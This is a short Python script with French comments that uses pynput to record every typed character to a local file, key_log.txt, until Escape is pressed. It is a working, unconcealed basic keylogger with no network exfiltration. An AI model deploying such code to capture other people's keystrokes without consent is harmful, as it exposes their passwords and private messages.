from pynput.keyboard import Listener, Key

def on_press(key):
    try:
        # Enregistrer uniquement les lettres
        with open("key_log.txt", "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
    except Exception as e:
        print(f"An error occurred: {e}")

def on_release(key):
    if key == Key.esc:
        # Arrêter le listener si 'Echap' est pressée
        return False

# Démarrer l'écoute du clavier
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
